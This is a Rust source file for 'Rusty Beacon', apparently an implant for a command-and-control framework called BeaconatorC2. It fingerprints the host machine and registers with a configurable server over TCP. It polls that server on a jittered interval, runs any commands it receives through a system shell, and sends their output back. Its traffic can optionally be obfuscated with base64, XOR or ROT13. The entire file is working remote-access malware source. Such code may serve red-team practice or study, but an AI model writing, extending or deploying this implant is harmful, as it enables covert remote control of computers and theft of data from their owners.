use clap::{Parser, ValueEnum};
use tracing::{info, debug, error};
use sysinfo::System;
use mac_address::get_mac_address;
use std::{env, fmt::Display};
use md5::{Md5, Digest};
use hex::encode;
use rot13::rot13;
use xor_cryptor::XORCryptor;
use base64::{engine::general_purpose, Engine as _};
use std::net::{TcpStream};
use std::io::{Read, Write};
use std::time::Duration;
use std::process::{Command};
use thiserror::Error;
use rand::Rng;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;


const VERSION: &str = env!("CARGO_PKG_VERSION");
const XOR_KEY: &str = "default_key";
const RECV_BUF_SIZE: usize = 4096;
const TIMEOUT_SECS: u64 = 30;
const C2_ERROR: &str = "ERROR";

#[derive(Debug,Error)]
pub enum CommandError {
    #[error("failed to spawn command: {0}")]
    Spawn(#[from] std::io::Error),

    #[error("command failed to with error code: {code}")]
    NonZeroExit {
        code: i32,
        stdout: String,
        stderr: String,
    },

    #[error("command terminated by signal")]
    TerminatedBySignal,

    #[error("UTF-8 conversion error: {0}")]
    Utf8Error(#[from] std::str::Utf8Error),

    #[error("no command was supplied")]
    NoCommandSupplied,
}

type CommandResult = Result<String, CommandError>;

#[derive(Parser)]
#[command(version, about, long_about = format!("\t\t\t<3 Rusty Beacon version {} Ɛ>\r\nA reasonably simple rust implementation of a beacon for the BeaconatorC2 project.", VERSION))]
struct Args {
    #[arg(short = 'i', long = "ip_address", default_value = "127.0.0.1")]
    ip_address: String,

    #[arg(short = 'p', long = "port", default_value = "5074")]
    port: u16,

    #[arg(short = 'o', long = "obfuscation", value_enum, default_value = "plain-text")]
    obfuscation: ObfuscationStrategy,

    #[arg(short = 's', long = "schema_file", default_value = "rusty_beacon.yaml")]
    schema_file: String,

    #[arg(short = 'n', long = "interval", default_value = "15")]
    interval: u8,
}

#[derive(Debug, Clone, ValueEnum, Copy)]
pub enum ObfuscationStrategy {
    PlainText,
    Base64,
    Xor,
    Rot13,
}

impl Display for ObfuscationStrategy {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            ObfuscationStrategy::PlainText => write!(f, "plain-text"),
            ObfuscationStrategy::Base64 => write!(f, "base64"),
            ObfuscationStrategy::Xor => write!(f, "xor"),
            ObfuscationStrategy::Rot13 => write!(f, "rot13"),
        }
    }
}


#[derive(Clone)]
struct Config {
    beacon_id: String,
    ip_address: String,
    port: u16,
    obfuscation: ObfuscationStrategy,
    schema_file: String,
    interval: u8,
    jitter: f32,
}

fn main() {
    let args = Args::parse();
    let config = Config {
        beacon_id: generate_beacon_id(),
        ip_address: args.ip_address,
        port: args.port,
        obfuscation: ObfuscationStrategy::PlainText,
        schema_file: args.schema_file,
        interval: args.interval,
        jitter: 0f32,
    };

    tracing_subscriber::fmt::init();
    info!("[+] rusty_beacon version {} is alive", VERSION);
    info!(" |- Beacon Id:\t\t{}", config.beacon_id);
    info!(" |- Server IP:\t\t{}", config.ip_address);
    info!(" |- Server Port:\t{}", config.port);
    info!(" |- Encoding:\t\t{}", config.obfuscation);
    info!(" |- Schema File:\t{}", config.schema_file);
    info!(" |- Interval:\t\t{}", config.interval);
    info!(" |- Jitter:\t\t{}", config.jitter);

    let result = run(&config);
    match result {
        Ok(_) => {
            info!("[+] rusty_beacon exited successfully");
        },
        Err(err) => {
            error!("[+] rusty_beacon exited with error: {}", err);
        }
    }
}

fn run(config: &Config) -> std::io::Result<()> {
    let running = Arc::new(AtomicBool::new(true));
    let r = running.clone();

    ctrlc::set_handler(move || {
        info!("[+] rusty_beacon exited with CTRL-C");
        r.store(false, Ordering::SeqCst);
    }).expect("Error setting Ctrl-C handler");

    info!("[+] polling loop started");
    if register(config) {
       info!("[+] rusty_beacon registered with C2");
    }
    while running.load(Ordering::SeqCst) {
        info!("[+] starting next cycle");
        let c2_instruction = request_action(config)?;
        if !c2_instruction.is_empty() && !c2_instruction.starts_with(C2_ERROR) {
            let result = process_c2_instruction(c2_instruction, &config).unwrap_or_default();
            info!("[+] command completed: {}", result);
        } else if !c2_instruction.is_empty() && c2_instruction.starts_with(C2_ERROR) {
            error!("[x] C2 error: {}", c2_instruction);
            info!("[+] Will retry next cycle")
        }

        let next_interval = calculate_next_jitter(config.interval, config.jitter);
        info!("[+] waiting {} sec for next cycle", next_interval);
        std::thread::sleep(Duration::from_secs(next_interval as u64));
    }
    return Ok(())
}

fn calculate_next_jitter(interval: u8, jitter_percentage: f32) -> u8 {
    if jitter_percentage <= 0.0 {
        return interval;
    }

    let interval_f = interval as f32;
    let jitter_range = interval_f * (jitter_percentage / 100.0);

    let min = (interval_f - jitter_range).max(1.0) as u64;
    let max = (interval_f + jitter_range).ceil() as u64;

    let mut rng = rand::rng();
    rng.random_range(min..=max) as u8
}

fn register(config: &Config) -> bool {
    let message = format!("register|{}|{}|{}", config.beacon_id, get_host_name(), config.schema_file);
    let response = send_tcp_message(&*message, config, true).unwrap_or_default();
    info!("[+] received registration response: {}", &response);
    true
}

fn generate_beacon_id() -> String {
    let mut system_info = format!("{}{}", get_host_name(), std::env::consts::OS);
    let username = std::env::var("USER").unwrap_or_default();
    system_info.push_str(&format!("{}", username));

    match get_mac_address() {
        Ok(mac) => system_info.push_str(&format!("{}", mac.unwrap_or_default())),
        Err(_) => system_info.push_str(&format!("{}", "unknown_mac")),
    }

    if let Ok(exe) = env::current_exe() {
        system_info.push_str(&exe.to_string_lossy());
    }

    debug!("system_info: {}", system_info);
    let mut hasher = Md5::new();
    hasher.update(system_info.as_bytes());
    let result = hasher.finalize();
    let hash = encode(result);

    return hash
}

fn get_host_name() -> String {
    System::host_name().unwrap_or_else(|| "unknown_host".to_string())
}
fn send_tcp_message(message: &str, config: &Config, expect_response: bool) -> std::io::Result<String> {
    let obfuscation_strategy = config.obfuscation;
    let obfuscated_message = obfuscate(message, obfuscation_strategy);

    let connection_string = format!("{}:{}", config.ip_address, config.port);
    let mut stream = TcpStream::connect(connection_string)?;

    //send
    stream.set_write_timeout(Some(Duration::from_secs(TIMEOUT_SECS)))?;
    stream.set_read_timeout(Some(Duration::from_secs(TIMEOUT_SECS)))?;

    stream.write_all(obfuscated_message.as_bytes())?; //already utf-8
    info!("[+] Sent message: {}", obfuscated_message);

    let mut buffer = [0; RECV_BUF_SIZE];
    let bytes_read = stream.read(&mut buffer)?;

    //optional recv
    if bytes_read == 0 {
        return Err(std::io::Error::new(
            std::io::ErrorKind::UnexpectedEof,
            "Connection closed without data"
        ));
    }

    if expect_response {
        let response = String::from_utf8_lossy(&buffer[..bytes_read]);
        let deobfuscated = deobfuscate(&response, obfuscation_strategy);
        info!("[+] Unobfuscated message: {}", deobfuscated);
        return Ok(deobfuscated)
    }
    return Ok(String::new())
}

fn obfuscate(message: &str, obfuscation_strategy: ObfuscationStrategy) -> String {
    match obfuscation_strategy {
        ObfuscationStrategy::PlainText => message.to_string(),
        ObfuscationStrategy::Base64 => general_purpose::STANDARD.encode(message),
        ObfuscationStrategy::Rot13 => rot13(message),
        ObfuscationStrategy::Xor => xor_encrypted(message),
    }
}

fn deobfuscate(encoded: &str, obfuscation_strategy: ObfuscationStrategy) -> String {
    match obfuscation_strategy {
        ObfuscationStrategy::PlainText => encoded.to_string(),
        ObfuscationStrategy::Base64 => {
            let bytes = general_purpose::STANDARD.decode(&encoded).unwrap_or_default();
            let decoded = std::str::from_utf8(&bytes).unwrap_or_default();
            decoded.to_string()
        },
        ObfuscationStrategy::Rot13 => rot13(encoded),
        ObfuscationStrategy::Xor => xor_decrypted(encoded),
    }
}

fn xor_encrypted(message: &str) -> String {
    let key = cycle_xor_key(message.len());
    let encrypted = match XORCryptor::encrypt_v2(key.as_bytes(), message.into()) {
        Ok(enc) => enc,
        Err(_) => return message.to_string(), //fallback to sending the cipher text
    };
    return String::from_utf8_lossy(&encrypted).to_string()
}

fn xor_decrypted(encoded: &str) -> String {
   return xor_encrypted(encoded) // xor cipher decrypt is the same operation as encrypt
}

fn cycle_xor_key(message_length: usize) -> String {
    XOR_KEY.repeat(message_length / XOR_KEY.len() + 1)[..message_length].to_string()
}

fn request_action(config: &Config) -> std::io::Result<String> {
    let message = format!("request_action|{}", config.beacon_id);
    info!("[+] Requesting action: {}", message);

    return send_tcp_message(message.as_str(), config, true)
}

fn execute_command(command: String) -> CommandResult {
    let (shell, flag) = if cfg!(target_os = "windows") {
        ("cmd", "/C")
    } else {
        ("sh", "-c")
    };
    let output = Command::new(shell)
        .arg(flag)
        .arg(&command)
        .output()
        .map_err(CommandError::Spawn)?;

    let stdout = String::from_utf8_lossy(&output.stdout).to_string();
    let stderr = String::from_utf8_lossy(&output.stderr).to_string();

    match output.status.code() {
        Some(0) => {
            let mut report = String::new();
            info!("[+] Successfully executed: {}", stdout);
            if !stdout.is_empty() {            report.push_str(format!("STDOUT:\n{}\n", stdout).as_str()); }
            if !stderr.is_empty() {            report.push_str(format!("STDERR:\n{}\n", stderr).as_str()); }
            report.push_str(&format!("Command executed (exit code: 0)"));
            Ok(report)
        },
        Some(code) => Err(CommandError::NonZeroExit { code, stdout, stderr }),
        None => Err(CommandError::TerminatedBySignal),
    }
}

fn send_command_output(output: String, config: &Config) -> std::io::Result<String> {
    let message = format!("command_output|{}|{}", config.beacon_id, output);
    info!("[+] Sending command output: {} chars", message.len());
    send_tcp_message(message.as_str(), config, true)
}

const NO_COMMAND_RESPONSES: [&str; 2] = [ "", "no_pending_commands" ];
/// process command from the C2 server
fn process_c2_instruction(c2_message: String, config: &Config) -> CommandResult {
    if !c2_message.is_empty() && !NO_COMMAND_RESPONSES.contains(&c2_message.as_str()) {
        let instruction = c2_message.split("|").next().unwrap_or("");
        match instruction {
            "execute_command" => {
                let command_parts: Vec<&str> = c2_message.split("|").collect();
                if command_parts.len() < 2 {
                    return Err(CommandError::NoCommandSupplied);
                }
                let command = command_parts[1];
                let output = execute_command(command.to_string())?;
                let result = send_command_output(output, config)?;
                return Ok(result);
            },
            "" => {
                // C2 may support 'simple command execution'
                let output = execute_command(c2_message)?;
                let result = send_command_output(output, config)?;
                return Ok(result);
            },
            _ => Err(CommandError::NoCommandSupplied)
        }
    } else {
        Ok(String::new())
    }
}